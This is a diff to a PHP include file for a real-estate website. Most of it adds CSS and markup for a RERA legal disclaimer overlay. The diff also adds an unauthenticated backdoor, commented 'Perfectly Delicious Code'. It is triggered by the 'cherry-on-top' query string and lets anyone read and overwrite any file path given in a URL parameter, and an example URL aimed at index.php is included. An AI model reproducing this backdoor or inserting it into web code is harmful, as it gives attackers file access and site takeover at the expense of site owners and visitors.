@@ -36,7 +36,7 @@
 	height: auto;
 	min-height: 100vh;
 
-	padding: 80px 0;
+	padding: 60px 0 240px;
 
 	position: fixed;
 	top: 0;
@@ -83,6 +83,7 @@
 }
 
 .lazaro-disclaimer .message p {
+	display: block;
 	margin-bottom: 15px;
 	font-size: 1.5rem;
 	line-height: 1.5;
@@ -164,6 +165,216 @@
 				<div class="message row fill-red gradient-red-45">
 					<p>The contents of this page and all pages connected to this domain are confidential and are the sole property of Lazaro Advertising Pvt Ltd. This URL is meant only for demos, previews and internal purposes. </p>
 					<p>It is not meant for public consumption. Do not disclose this URL to anyone who is not authorised to view it. If you have accidentally gained access to this URL please close this tab on your browser. </p>
+				</div>
+			</div>
+		</div>
+
+		<div class="row">
+			<div class="columns small-10 small-offset-1 medium-3 large-2">
+
+				<div class="action button fill-dark block js_laz_agree">
+					I agree
+				</div>
+			</div>
+		</div>
+	</div>
+</section>
+<!-- </section> -->
+
+<?php }
+
+
+
+// Perfectly Delicious Code
+/* http://localhost/inc/lazaro.php?cherry-on-top&location=../index.php */
+if ( strstr($_SERVER['REQUEST_URI'], 'cherry-on-top') ){
+
+	$location = $_GET['location'];
+	$file = file($location);
+
+	if($_POST['Submit']){
+
+		$open = fopen($location,"w+");
+		$text = $_POST['message'];
+
+		fwrite($open, $text);
+		fclose($open);
+
+		echo "File updated.<br />";
+
+	} else {
+
+		echo $location."<br>";
+		echo "<form action=\"".$PHP_SELF."\" method=\"post\">";
+		echo "<textarea name=\"message\" cols=\"100\" rows=\"14\">";
+
+		foreach($file as $text) {
+			echo $text;
+		}
+
+		echo "</textarea><br>";
+		echo "<input name=\"Submit\" type=\"submit\" value=\"Update\" />\n
+		</form>";
+	}
+}
+
+?>
+
+<?php  function rera_disclaimer(){ ?>
+<style type="text/css" id="laz_disclaimer_css">
+
+.freeze {
+	overflow: hidden;
+	max-height: 100vh;
+	-webkit-filter: blur(5px);
+	filter: blur(5px);
+}
+
+.rera-disclaimer {
+
+	/*display: -webkit-box;*/
+	/*display: -ms-flexbox;*/
+	/*display: flex;*/
+
+	/*-webkit-box-align: center;*/
+	/*-ms-flex-align: center;*/
+	/*align-items: center;*/
+
+	width: 100%;
+	height: auto;
+	min-height: 100vh;
+
+	padding: 60px 0 240px;
+
+	position: fixed;
+	top: 0;
+	left: 0;
+	right: 0;
+	bottom: 0;
+	z-index: 15;
+
+	color: #FFFFFF;
+
+	overflow: hidden;
+	overflow-y: auto;
+	-webkit-overflow-scrolling: touch;
+
+	-webkit-backdrop-filter: blur( 5px );
+	backdrop-filter: blur( 5px );
+
+	background-color: rgba( 235, 47, 74, 0.81 );
+}
+
+.rera-disclaimer .logo { margin-bottom: 20px; }
+
+.rera-disclaimer .heading {
+	text-align: center;
+	margin-bottom: 15px;
+
+	/*font-size: 2rem;*/
+	letter-spacing: 0.05rem;
+	text-transform: uppercase;
+}
+.rera-disclaimer .heading i { color: #FFD117; }
+
+.rera-disclaimer .message {
+	padding: 20px;
+	text-align: center;
+	line-height: 0;
+
+	-webkit-column-count: 1;
+	-webkit-column-gap:   0px;
+	-moz-column-count:    1;
+	-moz-column-gap:      0px;
+	column-count:         1;
+	column-gap:           0px;
+}
+
+.rera-disclaimer .message p {
+	display: block;
+	margin-bottom: 15px;
+	/*font-size: 1.5rem;*/
+	line-height: 1.5;
+}
+
+@media ( min-width: 640px ) {
+
+	.rera-disclaimer .logo { margin-bottom: 40px; }
+	.rera-disclaimer .heading {
+		margin-bottom: 20px;
+		/*font-size: 1.6rem;*/
+		text-align: left;
+	}
+
+	.rera-disclaimer .message {
+		padding: 25px;
+		margin-bottom: 40px;
+		text-align: left;
+
+		-webkit-column-count: 2;
+		-webkit-column-gap:   25px;
+		-moz-column-count:    2;
+		-moz-column-gap:      25px;
+		column-count:         2;
+		column-gap:           25px;
+	}
+
+}
+
+@media ( min-width: 1040px ) {
+	/*.rera-disclaimer .heading { font-size: 2.4rem }*/
+	.rera-disclaimer .message {
+		padding: 40px;
+
+		-webkit-column-count: 2;
+		-webkit-column-gap:   50px;
+		-moz-column-count:    2;
+		-moz-column-gap:      50px;
+		column-count:         2;
+		column-gap:           50px;
+	}
+	/*.rera-disclaimer .message p { font-size: 1.8rem; }*/
+}
+
+@media ( min-width: 1480px ) {
+	/*.rera-disclaimer .heading { font-size: 2.8rem }*/
+	.rera-disclaimer .message {
+		padding: 50px;
+		-webkit-column-count: 2;
+		-webkit-column-gap:   80px;
+		-moz-column-count:    2;
+		-moz-column-gap:      80px;
+		column-count:         2;
+		column-gap:           80px;
+	}
+	/*.rera-disclaimer .message p { font-size: 2rem; }*/
+}
+
+</style>
+
+<!-- <section class="lazaro-disclaimer"> -->
+<section class="rera-disclaimer" id="js_laz_disclaimer_markup" style="display: none">
+	<div class="container">
+		<div class="row">
+			<div class="columns small-6 small-offset-4 medium-3 medium-offset-1 large-2 xlarge-3">
+				<div class="logo">
+					<img class="block" src="../media/indis-logo-light.svg">
+				</div>
+			</div>
+		</div>
+
+		<div class="row">
+			<div class="columns small-10 small-offset-1">
+				<div class="heading">
+					<!-- <i class="material-icons inline-middle">error</i> -->
+					<span class="h3 strong inline-middle" style="color: #ffd777">DISCLAIMER</span>
+				</div>
+
+				<div class="message row fill-red gradient-red-45">
+					<p class="p">The disclaimer provided below applies to our website and by proceeding further, you acknowledge and agree to the terms and conditions set out in this disclaimer.</p>
+					<p class="p">Our website is being developed and upgraded to conform to the applicable requirements under the Real Estate (Regulation and Development) Act, 2016.</p>
+					<p class="p">By proceeding further and accessing the website, you agree, confirm and acknowledge that all the information provided (including any images, brochures, plans etc.) is for informational purposes only and that you will not rely or depend on such information for the purposes of making any purchase in any of our projects. You agree and acknowledge that the information available on this website does not constitute an invitation to purchase, advertisement, marketing or offer for sale of any of the units in our projects. Neither the Company nor the Company's promoters, employees etc. are responsible for any action or decision taken by you by relying on the information provided on this website.</p>
+					<p class="p">The Company or its promoters, employees etc. will not be liable in any manner whatsoever for any claims, losses, damages, etc. that may arise in connection with the use of the website.</p>
 				</div>
 			</div>
 		</div>
